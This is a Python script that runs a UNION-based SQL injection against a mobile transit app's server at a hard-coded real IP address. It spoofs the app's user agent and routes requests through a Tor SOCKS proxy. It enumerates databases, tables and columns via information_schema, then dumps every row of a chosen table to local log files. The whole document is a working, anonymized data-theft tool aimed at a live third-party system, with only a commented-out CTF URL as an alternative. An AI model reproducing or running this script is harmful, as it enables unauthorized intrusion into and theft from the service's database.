import requests, requesocks
import sys
import getopt
import ast

db_count	= "-1' union select 1,2,3,4,5,6,7,8,9,10,11,12,count(schema_name) from information_schema.schemata union select * from map_kullanici where '0'='1" 
db_fetch	= "-1' union select 1,2,3,4,5,6,7,8,9,10,11,12,schema_name from information_schema.schemata LIMIT %d,1 union select * from map_kullanici where '0'='1"

table_count = "-1' union select 1,2,3,4,5,6,7,8,9,10,11,12,count(table_name) from information_schema.tables where table_schema='%s' union select * from map_kullanici where '0'='1"
table_fetch = "-1' union select 1,2,3,4,5,6,7,8,9,10,11,12,table_name from information_schema.tables where table_schema='%s' LIMIT %d,1 union select * from map_kullanici where '0'='1"

column_count= "-1' union select 1,2,3,4,5,6,7,8,9,10,11,12,count(column_name) from information_schema.columns where table_name='%s' union select * from map_kullanici where '0'='1"
column_fetch= "-1' union select 1,2,3,4,5,6,7,8,9,10,11,12,group_concat(column_name) from information_schema.columns where table_name='%s' union select * from map_kullanici where '0'='1"

row_count	= "-1' union select 1,2,3,4,5,6,7,8,9,10,11,12,count(*) from %s.%s WHERE KODU=383 union select * from map_kullanici where '0'='1"
row_fetch	= "-1' union select 1,2,3,4,5,6,7,8,9,10,11,12,%s from %s.%s WHERE KODU=383 LIMIT %d,1 union select * from map_kullanici where '0'='1"

headers = {'User-agent': 'otobushatlari 2.0.5 HTC Vision 2.3.3'}
payload = {'UID': "", 'TIP':'Durak'}
proxy = {"http":"socks5://localhost:9050","https":"socks5://localhost:9050"}

url = 'http://212.175.165.42/mobil/android/tools.asp?SID=0.6759915620561532&VERSION=2.0.5&FNC=Connect'
#url = "http://ctf.0xdeffbeef.com/amq.php"

def getResult(uid):
	payload['UID'] = uid
	r = requesocks.post(url, data=payload, headers=headers, proxies=proxy)
	res = ast.literal_eval(r.text)
	print res['data'][0]['message']
	return res['data'][0]['message']
	
def getDBs():
	count = int(getResult(db_count))
	
	dbs = []
	for i in range(count):
		dbs.append(getResult(db_fetch % i))
	return dbs
	
def getTables(db):
	count = int(getResult(table_count % db))
	
	tbs = []
	for i in range(count):
		tbs.append(getResult(table_fetch % (db,i)))
	return tbs
	
def getColumns(tb):
	count = int(getResult(column_count % tb))
	cls = getResult(column_fetch % tb).split(',')
	return cls
	
	cls = []
	for i in range(count):
		cls.append(getResult(column_fetch % (tb,i)))
	print "|".join(cls)
	return cls
	
def getRows(db, tb, cols):
	count = int(getResult(row_count % (db,tb)))
	print count
	cur.write(str(count)+"\n")
	
	for col in cols:
		cur.write("|"+col)
	cur.write("|\n")
	
	rows = []
	for i in range(count):
		rows.append([])
		for col in cols:
			rows[i].append(getResult(row_fetch % (col,db,tb,i)))
		for col in rows[i]:
			cur.write("|"+col)
		print '|'.join(rows[i])
		cur.write("|\n")
		cur.flush()
	return rows

log = open('ego.log', 'w+')

cur = open('dbs.log', 'w+')
dbs = ['ego2008']#getDBs()
cur.write(str(len(dbs))+"\n")
for db in dbs:
	cur.write(db+"\n")
cur.close()

#import os
#os.makedirs("databases")
#os.makedirs("tables")

for db in dbs:
	log.write(db+"\n")
	log.flush()
	
	cur = open("databases/"+db+".log", 'w+')
	tbs = ['map_durak_new']#getTables(db)
	cur.write(str(len(tbs))+"\n")
	for tb in tbs:
		cur.write(tb+"\n")
	cur.close()
	
	for tb in tbs:
		log.write("\t"+tb+"\n")
		log.flush()
		
		cur = open("tables/"+db+"."+tb+".log", 'w+')
		
		cls = getColumns(tb)
		rows = getRows(db, tb, cls)
		cur.close()

log.close()
